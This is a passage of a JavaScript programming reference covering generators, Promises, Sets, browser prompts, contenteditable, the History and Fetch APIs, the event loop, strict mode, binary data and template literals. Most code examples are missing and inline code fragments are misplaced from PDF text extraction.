A generator is also an observer using which you can send some values back into the generator.

yield a.nextHere you can see that 1 is used like an expression which evaluates to some value. The value it evaluates to is the value sent as an argument to the  function call.
i.valuea.next(100So, for the first time  will be the first value yielded (1), and when continuing the iteration to the next state, we send a value back to the generator using ).
Doing async with Generators
Generators are widely used with spawn (from taskJS or co) function, where the function takes in a generator and allows us to write asynchronous code in a synchronous fashion. This does NOT mean that async code is converted to sync code / executed synchronously. It means that we can write code that looks like sync but internally it is still async.
Sync is BLOCKING; Async is WAITING. Writing code that blocks is easy. When PULLing, value appears in the assignment position. When PUSHing, value appears in the argument position of the callback.
When you use iterators, you PULL the value from the producer. When you use callbacks, the producer PUSHes the value to the argument position of the callback.

a.next() and in the second, v => {...Here, you pull the value from } is the callback and a value is PUSHed into the argument position v of the callback function.
Using this pull-push mechanism, we can write async programming like this,

So, looking at the above code, we are writing async code that looks like it's blocking (the yield statements wait for 100ms and then continue execution), but it's actually waiting. The pause and resume property of generator allows us to do this amazing trick.
How does it work ?
The spawn function uses yield promise to PULL the promise state from the generator, waits till the promise is resolved, and PUSHes the resolved value back to the generator so it can consume it.
Use it now
So, with generators and spawn function, you can clean up all your async code in NodeJS to look and feel like it's synchronous. This will make debugging easy. Also the code will look neat.
async...awaitThis feature is coming to future versions of JavaScript - as . But you can use them today in
ES2015/ES6 using the spawn function defined in the libraries - taskjs, co, or bluebird
Chapter 42: Promises
Section 42.1: Introduction
A Promise object represents an operation which has produced or will eventually produce a value. Promises provide a robust way to wrap the (possibly pending) result of asynchronous work, mitigating the problem of deeply nested callbacks (known as "callback hell").
States and control flow
A promise can be in one of three states:
pending - The underlying operation has not yet completed, and the promise is pending fulfillment.
fulfilled - The operation has finished, and the promise is fulfilled with a value. This is analogous to returning a value from a synchronous function.
rejected - An error has occurred during the operation, and the promise is rejected with a reason. This is analogous to throwing an error in a synchronous function.
A promise is said to be settled (or resolved) when it is either fulfilled or rejected. Once a promise is settled, it becomes immutable, and its state cannot change. The then and catch methods of a promise can be used to attach callbacks that execute when it is settled. These callbacks are invoked with the fulfillment value and rejection reason, respectively.

Example

The then and catch methods can be used to attach fulfillment and rejection callbacks:

promise.then(...) and promise.catch(...Note: Calling ) on the same promise might result in an Uncaught
exception in Promise if an error occurs, either while executing the promise or inside one of the callbacks, so the preferred way would be to attach the next listener on the promise returned by the previous then / catch.
Alternatively, both callbacks can be attached in a single call to then:

Attaching callbacks to a promise that has already been settled will immediately place them in the microtask queue, and they will be invoked "as soon as possible" (i.e. immediately after the currently executing script). It is not necessary to check the state of the promise before attaching callbacks, unlike with many other event-emitting implementations.
Live demo
Section 42.2: Promise chaining

Returning a Promise from a then callback will append it to the promise chain.

A catch allows a rejected promise to recover, similar to how catch in a try/catch statement works. Any chained then after a catch will execute its resolve handler using the value resolved from the catch.
const p = new Promise(resolve => {throw 'oh no'});
p.catch(() => 'oh yes').then(console.log.bind(console));  // outputs "oh yes"
If there are no catch or reject handlers in the middle of the chain, a catch at the end will capture any rejection in the chain:

  .catch(console.error.bind(console));  // outputs "oh yes"
On certain occasions, you may want to "branch" the execution of the functions. You can do it by returning different promises from a function depending on the condition. Later in the code, you can merge all of these branches into one to call other functions on them and/or to handle all errors in one place.

Thus, the execution order of the functions looks like:
promise --> handlerFn1 -> handlerFn2 --> handlerFn5 ~~> .catch()
         |                            ^
         V                            |
         -> handlerFn3 -> handlerFn4 -^            
The single catch will get the error on whichever branch it may occur.
Section 42.3: Waiting for multiple concurrent promises
Promise.allThe () static method accepts an iterable (e.g. an Array) of promises and returns a new promise, which resolves when all promises in the iterable have resolved, or rejects if at least one of the promises in the iterable have rejected.

.catch(reason => console.log(reason)); // outputs "Error!" after 6 seconds.
Non-promise values in the iterable are "promisified".

Destructuring assignment can help to retrieve results from multiple promises.

Section 42.4: Reduce an array to chained promises
This design pattern is useful for generating a sequence of asynchronous actions from a list of elements.
There are two variants :
the "then" reduction, which builds a chain that continues as long as the chain experiences success.
the "catch" reduction, which builds a chain that continues as long as the chain experiences error.
The "then" reduction
thenThis variant of the pattern builds a .() chain, and might be used for chaining animations, or making a sequence of dependent HTTP requests.

Explanation:
reduce() on a source array, and provide Promise.resolve1. We call .() as an initial value.
then2. Every element reduced will add a .() to the initial value.
reduce3.()'s product will be Promise.resolve().then(...).then(...).
then(successHandler, errorHandler4. We manually append a .) after the reduce, to execute successHandler once all the previous steps have resolved. If any step was to fail, then errorHandler would execute.
Promise.allNote: The "then" reduction is a sequential counterpart of ().
The "catch" reduction
catchThis variant of the pattern builds a .() chain and might be used for sequentially probing a set of web servers for some mirrored resource until a working server is found.

Explanation:
reduce() on a source array, and provide Promise.reject1. We call .() as an initial value.
catch2. Every element reduced will add a .() to the initial value.
reduce()'s product will be Promise.reject().catch(...).catch(...3.).
then(successHandler, errorHandler4. We manually append .) after the reduce, to execute successHandler once any of the previous steps has resolved. If all steps were to fail, then errorHandler would execute.
Promise.any() (as implemented in bluebird.jsNote: The "catch" reduction is a sequential counterpart of , but not currently in native ECMAScript).
Section 42.5: Waiting for the first of multiple concurrent promises
Promise.raceThe () static method accepts an iterable of Promises and returns a new Promise which resolves or rejects as soon as the first of the promises in the iterable has resolved or rejected.


Section 42.6: "Promisifying" functions with callbacks
Given a function that accepts a Node-style callback,

you can promisify it (convert it to a promise-based function) like this:

This function can then be used as follows:

In a more generic way, here's how to promisify any given callback-style function:

This can be used like this:

Section 42.7: Error Handling
Errors thrown from promises are handled by the second parameter (reject) passed to then or by the handler passed to catch:


Chaining
If you have a promise chain then an error will cause resolve handlers to be skipped:

The same applies to your then functions. If a resolve handler throws an exception then the next reject handler will be invoked:

An error handler returns a new promise, allowing you to continue a promise chain. The promise returned by the error handler is resolved with the value returned by the handler:

You can let an error cascade down a promise chain by re-throwing the error:

It is possible to throw an exception that is not handled by the promise by wrapping the throw statement inside a setTimeout callback:

This works because promises cannot handle exceptions thrown asynchronously. Unhandled rejections
An error will be silently ignored if a promise doesn't have a catch block or reject handler:

To prevent this, always use a catch block:

Alternatively, subscribe to the unhandledrejection event to catch any unhandled rejected promises:

Some promises can handle their rejection later than their creation time. The rejectionhandled event gets fired whenever such a promise is handled:

event.reason is the error object and event.promiseThe event argument contains information about the rejection. is the promise object that caused the event.
In Nodejs the rejectionhandled and unhandledrejection events are called rejectionHandled and unhandledRejection on process, respectively, and have a different signature:
process.on('rejectionHandled', (reason, promise) => {}); process.on('unhandledRejection', (reason, promise) => {});
The reason argument is the error object and the promise argument is a reference to the promise object that caused the event to fire.
Usage of these unhandledrejection and rejectionhandled events should be considered for debugging purposes only. Typically, all promises should handle their rejections.
Note: Currently, only Chrome 49+ and Node.js support unhandledrejection and rejectionhandled events.
Caveats
Chaining with fulfill and reject
then(fulfill, rejectThe ) function (with both parameters not null) has unique and complex behavior, and shouldn't be used unless you know exactly how it works.
The function works as expected if given null for one of the inputs:

However, it adopts unique behavior when both inputs are given:

then(fulfill, reject) function looks like it is a shortcut for then(fulfill).catch(rejectThe ), but it is not, and
will cause problems if used interchangeably. One such problem is that the reject handler does not handle errors from the fulfill handler. Here is what will happen:
Promise.resolve() // previous promise is fulfilled
    .then(() => { throw new Error(); }, // error in the fulfill handler         error => { /* this is not called! */ });
The above code will result in a rejected promise because the error is propagated. Compare it to the following code, which results in a fulfilled promise:
Promise.resolve() // previous promise is fulfilled
    .then(() => { throw new Error(); }) // error in the fulfill handler
    .catch(error => { /* handle error */ });
then(fulfill, reject) interchangeably with catch(reject).then(fulfillA similar problem exists when using ), except with propagating fulfilled promises instead of rejected promises. Synchronously throwing from function that should return a promise Imagine a function like this:

If such function is used in the middle of a promise chain, then apparently there is no problem:

However, if the same function is called outside of a promise chain, then the error will not be handled by it and will be thrown to the application:
foo('unexpectedValue') // <-- error will be thrown, so the application will crash
  .then(makeSomethingAsync) // <-- will not run
  .catch(err => console.log(err)) // <-- will not catch
There are 2 possible workarounds:
Return a rejected promise with the error
Instead of throwing, do as follows:

Wrap your function into a promise chain
Your throw statement will be properly caught when it is already inside a promise chain:

Section 42.8: Reconciling synchronous and asynchronous operations
In some cases you may want to wrap a synchronous operation inside a promise to prevent repetition in code branches. Take this example:

The synchronous and asynchronous branches of the above code can be reconciled by redundantly wrapping the synchronous operation inside a promise:

When caching the result of an asynchronous call, it is preferable to cache the promise rather than the result itself. This ensures that only one asynchronous operation is required to resolve multiple parallel requests.
Care should be taken to invalidate cached values when error conditions are encountered.


Section 42.9: Delay function call
setTimeoutThe () method calls a function or evaluates an expression after a specified number of milliseconds. It is also a trivial way to achieve an asynchronous operation.
In this example calling the wait function resolves the promise after the time specified as first argument:

Section 42.10: "Promisifying" values
Promise.resolveThe  static method can be used to wrap values into promises.

Promise.resolveIf value is already a promise,  simply recasts it.

Promise.resolveIn fact, value can be any "thenable" (object defining a then method that works sufficiently like a spec-compliant promise). This allows  to convert untrusted 3rd-party objects into trusted 1st-party Promises.


Promise.rejectThe  static method returns a promise which immediately rejects with the given reason.

Section 42.11: Using ES2017 async/await
try/catchThe same example above, Image loading, can be written using async functions. This also allows using the common  method for exception handling.
Note: as of April 2017, the current releases of all browsers but Internet Explorer supports async functions.

Section 42.12: Performing cleanup with finally()
There is currently a proposal (not yet part of the ECMAScript standard) to add a finally callback to promises that will be executed regardless of whether the promise is fulfilled or rejected. Semantically, this is similar to the finally clause of the try block.
You would usually use this functionality for cleanup:


It is important to note that the finally callback doesn't affect the state of the promise. It doesn't matter what value it returns, the promise stays in the fulfilled/rejected state that it had before. So in the example above the promise
processData(result.datawill be resolved with the return value of ) even though the finally callback returned undefined.
With the standardization process still being in progress, your promises implementation most likely won't support finally callbacks out of the box. For synchronous callbacks you can add this functionality with a polyfill however:

Section 42.13: forEach with promises
It is possible to effectively apply a function (cb) which returns a promise to each element of an array, with each element waiting to be processed until the previous element is processed.

This can be helpful if you need to efficiently process thousands of items, one at a time. Using a regular for loop to create the promises will create them all at once and take up a significant amount of RAM.
Section 42.14: Asynchronous API request
This is an example of a simple GET API call wrapped in a promise to take advantage of its asynchronous functionality.


More robust error handling can be done using the following onload and onerror functions.

Chapter 43: Set
Parameter	Details
           If an iterable object is passed, all of its elements will be added to the new Set. null is treated as iterable undefined.
value	The value of the element to add to the Set object. callback	Function to execute for each element. thisArg	Optional. Value to use as this when executing callback.
The Set object lets you store unique values of any type, whether primitive values or object references.
Set objects are collections of values. You can iterate through the elements of a set in insertion order. A value in the Set may only occur ONCE; it is unique in the Set's collection. Distinct values are discriminated using the SameValueZero comparison algorithm.
Standard Specification About Set
Section 43.1: Creating a Set
The Set object lets you store unique values of any type, whether primitive values or object references.
You can push items into a set and iterate them similar to a plain JavaScript array, but unlike array, you cannot add a value to a Set if the value already exist in it.
To create a new set:

Or you can create a set from any iterable object to give it starting values:

the original array used to create it.
Section 43.2: Adding a value to a Set
addTo add a value to a Set, use the .() method:

If the value already exist in the set it will not be added again, as Sets contain unique values.
addNote that the .() method returns the set itself, so you can chain add calls together:

Section 43.3: Removing value from a set
deleteTo remove a value from a set, use .() method:

This function will return true if the value existed in the set and was removed, or false otherwise.
Section 43.4: Checking if a value exist in a set
hasTo check if a given value exists in a set, use .() method:

Will return true if someVal appears in the set, false otherwise.
Section 43.5: Clearing a Set
clearYou can remove all the elements in a set using the .() method:

Section 43.6: Getting set length
sizeYou can get the number of elements inside the set using the . property

Array.prototype.lengthThis property, unlike , is read-only, which means that you can't change it by assigning something to it:

In strict mode it even throws an error:
TypeError: Cannot set property size of #<Set> which has only a getter
Section 43.7: Converting Sets to arrays
Array.prototypeSometimes you may need to convert a Set to an array, for example to be able to use  methods like
filter(). In order to do so, use Array.from() or destructuring-assignment.:

Now you can filter the array to contain only even numbers and convert it back to Set using Set constructor:

mySet now contains only even numbers:

Section 43.8: Intersection and dierence in Sets
There are no build-in methods for intersection and difference in Sets, but you can still achieve that but converting them to arrays, filtering, and converting back to Sets:
var set1 = new Set([1, 2, 3, 4]),     set2 = new Set([3, 4, 5, 6]);
const intersection = new Set(Array.from(set1).filter(x => set2.has(x)));//Set {3, 4} const difference = new Set(Array.from(set1).filter(x => !set2.has(x))); //Set {1, 2}
Section 43.9: Iterating Sets
You can use a simple for-of loop to iterate a Set:

When iterating over a set, it will always return values in the order they were first added to the set. For example:

forEach() method, similar to Array.prototype.forEachThere's also a .(). It has two parameters, callback, which will be executed for each element, and optional thisArg, which will be used as this when executing callback.
Array.prototype.forEach() and Map.prototype.forEachcallback has three arguments. The first two arguments are both the current element of Set (for consistency with ()) and the third argument is the Set itself.
mySet.forEach((value, value2, set) => console.log(value)); // logs 1, 2 and 3
Chapter 44: Modals - Prompts
Section 44.1: About User Prompts
User Prompts are methods part of the Web Application API used to invoke Browser modals requesting a user action such as confirmation or input.
window.alert(message)
Show a modal popup with a message to the user. Requires the user to click [OK] to dismiss.

More information below in "Using alert()".
boolean = window.confirm(message)
Show a modal popup with the provided message.
Provides [OK] and [Cancel] buttons which will respond with a boolean value true / false respectively.

result = window.prompt(message, defaultValue)
Show a modal popup with the provided message and an input field with an optional pre-filled value. Returns as result the user provided input value.

More information below in "Usage of prompt()".
window.print()
Opens a modal with document print options.

Section 44.2: Persistent Prompt Modal
When using prompt a user can always click Cancel and no value will be returned. To prevent empty values and make it more persistent:


jsFiddle demo
Section 44.3: Confirm to Delete element
confirmA way to use () is when some UI action does some destructive changes to the page and is better accompanied by a notification and a user confirmation - like i.e. before deleting a post message:

jsFiddle demo
Section 44.4: Usage of alert()
alertThe () method of the window object displays an alert box with a specified message and an  OK  or  Cancel button. The text of that button depends on the browser and can't be modified.
Syntax

Produces

An alert box is often used if you want to make sure information comes through to the user.
Note: The alert box takes the focus away from the current window, and forces the browser to read the message.
Do not overuse this method, as it prevents the user from accessing other parts of the page until the box is closed. Also it stops the further code execution, until user clicks  OK . (in particular, the timers which were set with
setInterval() or setTimeout() don't tick either). The alert box only works in browsers, and its design cannot be
modified.
Parameter	Description
           Required. Specifies the text to display in the alert box, or an object converted into a string and message
displayed.
Return value alert function doesn't return any value
Section 44.5: Usage of prompt()
Prompt will display a dialog to the user requesting their input. You can provide a message that will be placed above the text field. The return value is a string representing the input provided by the user.

promptYou can also pass () a second parameter, which will be displayed as the default text in the prompt's text field.

Parameter	Description
message	Required. Text to display above the text field of the prompt. default	Optional. Default text to display in the text field when the prompt is displayed.
Chapter 45: execCommand and contenteditable
	commandId	value
⋮ Inline formatting commands 
backColorColor value Stringbold createLinkURL StringfontNameFont family namefontSize"1", "2", "3", "4", "5", "6", "7"foreColorColor value StringstrikeThrough superscript unlink ⋮ Block formatting commands delete	 
formatBlock	"address", "dd", "div", "dt", "h1", "h2", "h3", "h4", "h5", "h6", "p", "pre"
forwardDelete	 insertHorizontalRule	 
insertHTML HTML String insertImage URL String insertLineBreak	 insertOrderedList insertParagraph insertText	Text string insertUnorderedList justifyCenter	 justifyFull	 justifyLeft	 justifyRight	 outdent	 
⋮ Clipboard commands	 copy	Currently Selected String cut	Currently Selected String paste	 
⋮ Miscellaneous commands	 defaultParagraphSeparator	 redo	 selectAll	 styleWithCSS	 undo	 useCSS	 
Section 45.1: Listening to Changes of contenteditable
Events that work with most form elements (e.g., change, keydown, keyup, keypress) do not work with contenteditable.
Instead, you can listen to changes of contenteditable contents with the input event. Assuming contenteditableHtmlElement is a JS DOM object that is contenteditable:

Section 45.2: Getting started
The HTML attribute contenteditable provides a simple way to turn a HTML element into a user-editable area

Native Rich-Text editing
Using JavaScript and execCommandW3C you can additionally pass more editing features to the currently focused contenteditable element (specifically at the caret position or selection).
The execCommand function method accepts 3 arguments

(see: Parameters→value)
Example using the "bold" command and "formatBlock" (where a value is expected):
document.execCommand("bold", false, "");          // Make selected text bold document.execCommand("formatBlock", false, "H2"); // Make selected text Block-level <h2>
Quick Start Example:


jsFiddle demo
Basic Rich-Text editor example (Modern browsers)
Final thoughts
Even being present for a long time (IE6), implementations and behaviors of execCommand vary from browser to browser making "building a Fully-featured and cross-browser compatible WYSIWYG editor" a hard task to any experienced JavaScript developer.
Even if not yet fully standardized you can expect pretty decent results on the newer browsers like Chrome, Firefox, Edge. If you need better support for other browsers and more features like HTMLTable editing etc. a rule of thumbs is to look for an already existent and robust Rich-Text editor.
Section 45.3: Copy to clipboard from textarea using execCommand("copy")
Example:

Section 45.4: Formatting
Users can add formatting to contenteditable documents or elements using their browser's features, such as common keyboard shortcuts for formatting ( Ctrl-B  for bold,  Ctrl-I  for italic, etc.) or by dragging and dropping images, links, or markup from the clipboard.
Additionally, developers can use JavaScript to apply formatting to the current selection (highlighted text).
document.execCommand('bold', false, null); // toggles bold formatting document.execCommand('italic', false, null); // toggles italic formatting document.execCommand('underline', false, null); // toggles underline

Chapter 46: History
Parameter	Details
domain	The domain you want to update to title	The title to update to path	The path to update to
Section 46.1: history.pushState()
Syntax :

This method allows to ADD histories entries. For more reference, Please have a look on this document : pushState() method
Example : window.history.pushState("http://example.ca", "Sample Title", "/example/path.html");
This example inserts a new record into the history, address bar, and page title.
history.replaceStateNote this is different from the (). Which updates the current history entry, rather than adding a new one.
Section 46.2: history.replaceState()
Syntax :

This method modifies the current history entry instead of creating a new one. Mainly used when we want to update URL of the current history entry. window.history.replaceState("http://example.ca", "Sample Title", "/example/path.html");
This example replaces the current history, address bar, and page title.
history.pushStateNote this is different from the (). Which inserts a new history entry, rather than replacing the current one.
Section 46.3: Load a specific URL from the history list
go() method
The go() method loads a specific URL from the history list. The parameter can either be a number which goes to the URL within the specific position (-1 goes back one page, 1 goes forward one page), or a string. The string must be a partial or full URL, and the function will go to the first URL that matches the string. 	Syntax



Chapter 47: Navigator Object
Section 47.1: Get some basic browser data and return it as a JSON object
The following function can be used to get some basic information about the current browser and return it in JSON format.

Chapter 48: BOM (Browser Object Model)
Section 48.1: Introduction
The BOM (Browser Object Model) contains objects that represent the current browser window and components; objects that model things like history, device's screen, etc
The topmost object in BOM is the window object, which represents the current browser window or tab.

Section 48.2: Window Object Properties
The Window Object contains the following properties.
	Property	Description
window.closed	Whether the window has been closed
<iframewindow.length	Number of > elements in window window.name	Gets or sets the name of the window window.innerHeight Height of window window.innerWidth	Width of window window.screenX	X-coordinate of pointer, relative to top left corner of screen window.screenY	Y-coordinate of pointer, relative to top left corner of screen window.location	Current URL of window object (or local file path) window.history	Reference to history object for browser window or tab.
window.screen	Reference to screen object window.pageXOffset Distance document has been scrolled horizontally window.pageYOffset Distance document has been scrolled vertically
Section 48.3: Window Object Methods
Browser Object ModelThe most important object in the  is the window object. It helps in accessing information about the browser and its components. To access these features, it has various methods and properties.
MethodDescriptionwindow.alert()Creates dialog box with message and an OK buttonwindow.blur()Remove focus from windowwindow.close()Closes a browser windowwindow.confirm()Creates dialog box with message, an OK button and a cancel buttonwindow.getComputedStyle() Get CSS styles applied to an element
window.moveTo(x,y)Move a window's left and top edge to supplied coordinateswindow.open()Opens new browser window with URL specified as parameterwindow.print()Tells browser that user wants to print contents of current pagewindow.prompt()Creates dialog box for retrieving user inputwindow.scrollBy()Scrolls the document by the specified number of pixelswindow.scrollTo()Scrolls the document to the specified coordinateswindow.setInterval()Do something repeatedly at specified intervalswindow.setTimeout()Do something after a specified amount of timewindow.stop()Stop window from loadingChapter 49: The Event Loop
Section 49.1: The event loop in a web browser
The vast majority of modern JavaScript environments work according to an event loop. This is a common concept in computer programming which essentially means that your program continually waits for new things to happen, and when they do, reacts to them. The host environment calls into your program, spawning a "turn" or "tick" or "task" in the event loop, which then runs to completion. When that turn has finished, the host environment waits for something else to happen, before all this starts.
A simple example of this is in the browser. Consider the following example:

In this example, the host environment is the web browser.
<script1. The HTML parser will first execute the >. It will run to completion.
2. The call to setTimeout tells the browser that, after 100 milliseconds, it should enqueue a task to perform the given action.
3. In the meantime, the event loop is then responsible for continually checking if there's something else to do:
for example, rendering the web page.
4. After 100 milliseconds, if the event loop is not busy for some other reason, it will see the task that setTimeout enqueues, and run the function, logging those two statements.
5. At any time, if someone clicks on the body, the browser will post a task to the event loop to run the click handler function. The event loop, as it goes around continually checking what to do, will see this, and run that function.
You can see how in this example there are several different types of entry points into JavaScript code, which the event loop invokes:
<scriptThe > element is invoked immediately
The setTimeout task is posted to the event loop and run once
The click handler task can be posted many times and run each time
Each turn of the event loop is responsible for many things; only some of them will invoke these JavaScript tasks. For full details, see the HTML specification
setTimeout callback log One last thing: what do we mean by saying that each event loop task "runs to completion"? We mean that it is not generally possible to interrupt a block of code that is queued to run as a task, and it is never possible to run code interleaved with another block of code. For example, even if you clicked at the perfect time, you could never get the above code to log "onclick" in between the two 1/2"s. This is due to the way the taskposting works; it is cooperative and queue-based, instead of preemptive.
Section 49.2: Asynchronous operations and the event loop
Many interesting operations in common JavaScript programming environments are asynchronous. For example, in the browser we see things like

and in Node.js we see things like

How does this fit with the event loop?
file.txtHow this works is that when these statements execute, they tell the host environment (i.e., the browser or Node.js runtime, respectively) to go off and do something, probably in another thread. When the host environment is done doing that thing (respectively, waiting 100 milliseconds or reading the file ) it will post a task to the event loop, saying "call the callback I was given earlier with these arguments".
The event loop is then busy doing its thing: rendering the webpage, listening for user input, and continually looking for posted tasks. When it sees these posted tasks to call the callbacks, it will call back into JavaScript. That's how you get asynchronous behavior!
Chapter 50: Strict mode
Section 50.1: For entire scripts
"use strict"Strict mode can be applied on entire scripts by placing the statement ; before any other statements.

Strict mode is only enabled in scripts where you define "use strict". You can combine scripts with and without strict mode, because the strict state is not shared among different scripts.
Version ≥ 6
Note: All code written inside ES2015+ modules and classes are strict by default.
Section 50.2: For functions
"use strict"Strict mode can also be applied to single functions by prepending the ; statement at the beginning of the function declaration.

Strict mode will also apply to any inner scoped functions.
Section 50.3: Changes to properties
Strict mode also prevents you from deleting undeletable properties.

The above statement would simply be ignored if you don't use strict mode, however now you know why it does not execute as expected.
It also prevents you from extending a non-extensible property.


Section 50.4: Changes to global properties
In a non-strict-mode scope, when a variable is assigned without being initialized with the var, const or the let keyword, it is automatically declared in the global scope:

In strict mode however, any access to an undeclared variable will throw a reference error:

This is useful because JavaScript has a number of possible events that are sometimes unexpected. In non-strictmode, these events often lead developers to believe they are bugs or unexpected behavior, thus by enabling strictmode, any errors that are thrown enforces them to know exactly what is being done.
"use strict";
                       // Assuming a global variable mistypedVariable exists mistypedVaraible = 17; // this line throws a ReferenceError due to the
                       // misspelling of variable
This code in strict mode displays one possible scenario: it throws a reference error which points to the assignment's line number, allowing the developer to immediately detect the mistype in the variable's name.
In non-strict-mode, besides the fact that no error is thrown and the assignment is successfully made, the mistypedVaraible will be automatically declared in the global scope as a global variable. This implies that the developer needs to look up manually this specific assignment in the code.
Furthermore, by forcing declaration of variables, the developer cannot accidentally declare global variables inside functions. In non-strict-mode:

In strict mode, it is necessary to explicitly declare the variable:

The variable can also be declared outside and after a function, allowing it to be used, for instance, in the global scope:

Section 50.5: Duplicate Parameters
Strict mode does not allow you to use duplicate function parameter names.

Section 50.6: Function scoping in strict mode
In Strict Mode, functions declared in a local block are inaccessible outside the block.

Scope-wise, function declarations in Strict Mode have the same kind of binding as let or const.
Section 50.7: Behaviour of a function's arguments list
arguments object behave different in strict and non strict mode. In non-strict mode, the argument object will reflect the changes in the value of the parameters which are present, however in strict mode any changes to the value of the parameter will not be reflected in the argument object.

For the above code, the arguments object is changed when we change the value of the parameters. However, for strict mode, the same will not be reflected.


It's worth noting that, if any one of the parameters is undefined, and we try to change the value of the parameter in both strict-mode or non-strict mode the arguments object remains unchanged.
Strict mode

Non-Strict Mode

Section 50.8: Non-Simple parameter lists




Chapter 51: Custom Elements
	Parameter	Details
name	The name of the new custom element. options.extends	The name of the native element being extended, if any. options.prototype The custom prototype to use for the custom element, if any.
Section 51.1: Extending Native Elements
<img>It's possible to extent native elements, but their descendants don't get to have their own tag names. Instead, the is attribute is used to specify which subclass an element is supposed to use. For example, here's an extension of the  element which logs a message to the console when it's loaded.

Section 51.2: Registering New Elements
<initially-hidden>Defines an  custom element which hides its contents until a specified number of seconds have elapsed.

Chapter 52: Data Manipulation
Section 52.1: Format numbers as money
1234567.89 => "1,234,567.89"Fast and short way to format value of type Number as money, e.g. :

 .. n], variable size of number groups [0 .. x]More advanced variant with support of any number of decimals [0 and different delimiter types:

Section 52.2: Extract extension from file name
Fast and short way to extract extension from file name in JavaScript will be:

.htaccessIt works correctly both with names having no extension (e.g. myfile) or starting with . dot (e.g. ):
get_extension('')                           // "" get_extension('name')                       // "" get_extension('name.txt')                   // "txt" get_extension('.htpasswd')                  // "" get_extension('name.with.many.dots.myext')  // "myext"
The following solution may extract file extensions from full path:
function get_extension(path) {     var basename = path.split(/[\\/]/).pop(),  // extract file name from full path ...                                                // (supports `\\` and `/` separators)         pos = basename.lastIndexOf('.');       // get last position of `.`

Section 52.3: Set object property given its string name

Chapter 53: Binary Data
Section 53.1: Getting binary representation of an image file
This example is inspired by this question.
We'll assume you know how to load a file using the File API.

Now we perform the actual conversion of the file data into 1's and 0's using a DataView:

toStringDataViews let you read/write numeric data; getInt8 converts the data from the byte position - here 0, the value passed in - in the ArrayBuffer to signed 8-bit integer representation, and (2) converts the 8-bit integer to binary representation format (i.e. a string of 1's and 0's).
Files are saved as bytes. The 'magic' offset value is obtained by noting we are taking files stored as bytes i.e. as 8-bit integers and reading it in 8-bit integer representation. If we were trying to read our byte-saved (i.e. 8 bits) files to 32-bit integers, we would note that 32/8 = 4 is the number of byte spaces, which is our byte offset value.
For this task, DataViews are overkill. They are typically used in cases where endianness or heterogeneity of data are encountered (e.g. in reading PDF files, which have headers encoded in different bases and we would like to meaningfully extract that value). Because we just want a textual representation, we do not care about heterogeneity as there is never a need to
A much better - and shorter - solution can be found using an UInt8Array typed array, which treats the entire ArrayBuffer as composed of unsigned 8-bit integers:

Section 53.2: Converting between Blobs and ArrayBuers
JavaScript has two primary ways to represent binary data in the browser. ArrayBuffers/TypedArrays contain mutable (though still fixed-length) binary data which you can directly manipulate. Blobs contain immutable binary data which can only be accessed through the asynchronous File interface.

Version ≥ 6
Convert a Blob to an ArrayBuffer using a Promise (asynchronous)


Section 53.3: Manipulating ArrayBuers with DataViews
DataViews provide methods to read and write individual values from an ArrayBuffer, instead of viewing the entire thing as an array of a single type. Here we set two bytes individually then interpret them together as a 16-bit unsigned integer, first big-endian then little-endian.

Section 53.4: Creating a TypedArray from a Base64 string


Section 53.5: Using TypedArrays
TypedArrays are a set of types providing different views into fixed-length mutable binary ArrayBuffers. For the most part, they act like Arrays that coerce all assigned values to a given numeric type. You can pass an ArrayBuffer instance to a TypedArray constructor to create a new view of its data.

slice(...ArrayBuffers can be copied using the .) method, either directly or through a TypedArray view.

Section 53.6: Iterating through an arrayBuer
For a convenient way to iterate through an arrayBuffer, you can create a simple iterator that implements the DataView methods under the hood:


You can then create an iterator like this:

You can use the hasNext to check if there's still items

You can use the next method to take the next value:

With such an iterator, writing your own parser to process binary data becomes pretty easy.
Chapter 54: Template Literals
Template literals are a type of string literal that allows values to be interpolated, and optionally the interpolation and construction behaviour to be controlled using a "tag" function.
Section 54.1: Basic interpolation and multiline strings
Template literals are a special type of string literal that can be used instead of the standard '...' or "...". They are declared by quoting the string with backticks instead of the standard single or double quotes: `...`.
 expression Template literals can contain line breaks and arbitrary expressions can be embedded using the ${} substitution syntax. By default, the values of these substitution expressions are concatenated directly into the string where they appear.

Section 54.2: Tagged strings
A function identified immediately before a template literal is used to interpret it, in what is called a tagged template literal. The tag function can return a string, but it can also return any other type of value.
...substitutionsThe first argument to the tag function, strings, is an Array of each constant piece of the literal. The remaining arguments, , contain the evaluated values of each ${} substitution expression.

rawThe strings Array has a special . property referencing a parallel Array of the same constant pieces of the template literal but exactly as they appear in the source code, without any backslash-escapes being replaced.


Section 54.3: Raw strings
String.rawThe  tag function can be used with template literals to access a version of their contents without interpreting any backslash escape sequences.
String.raw`\n` will contain a backslash and the lowercase letter n, while `\n` or '\n' would contain a single newline character instead.

Section 54.4: Templating HTML With Template Strings
You can create an HTML`...` template string tag function to automatically encodes interpolated values. (This requires that interpolated values are only used as text, and may not be safe if interpolated values are used in code such as scripts or styles.)


Section 54.5: Introduction
Template Literals act like strings with special features. They are enclosed by by the back-tick `` and can be spanned across multiple lines.
Template Literals can contain embedded expressions too. These expressions are indicated by a $ sign and curly braces {}

There are many other features of String Literals such as Tagged Template Literals and Raw property. These are demonstrated in other examples.
Chapter 55: Fetch
OptionsDetailsmethodThe HTTP method to use for the request. ex: GET, POST, PUT, DELETE, HEAD. Defaults to GET.headersA Headers object containing additional HTTP headers to include in the request.bodyThe request payload, can be a string or a FormData object. Defaults to undefinedno-cachecache	The caching mode. default, reload, 
referrerThe referrer of the request.no-cors, same-origin. Defaults to no-corssame-originmode	cors, . credentialsomit, , include. Defaults to omit. redirect	follow, error, manual. Defaults to follow. integrity Associated integrity metadata. Defaults to empty string.
Section 55.1: Getting JSON data

Section 55.2: Set Request Headers

Section 55.3: POST Data
Posting form data

Posting JSON data

Section 55.4: Send cookies
The fetch function does not send cookies by default. There are two possible ways to send cookies:
1. Only send cookies if the URL is on the same origin as the calling script.

2. Always send cookies, even for cross-origin calls.

Section 55.5: GlobalFetch
The GlobalFetch interface exposes the fetch function, which can be used to request resources.

The resolved value is a Response Object. This Object contains the body of the response, as well as its status and headers.
Section 55.6: Using Fetch to Display Questions from the Stack Overflow API

Chapter 56: Scope
Section 56.1: Closures
When a function is declared, variables in the context of its declaration are captured in its scope. For example, in the code below, the variable x is bound to a value in the outer scope, and then the reference to x is captured in the context of bar:

This concept of "capturing" scope is interesting because we can use and modify variables from an outer scope even after the outer scope exits. For example, consider the following:

In the above example, when foo is called, its context is captured in the function bar. So even after it returns, bar can still access and modify the variable x. The function foo, whose context is captured in another function, is said to be a closure.
Private data
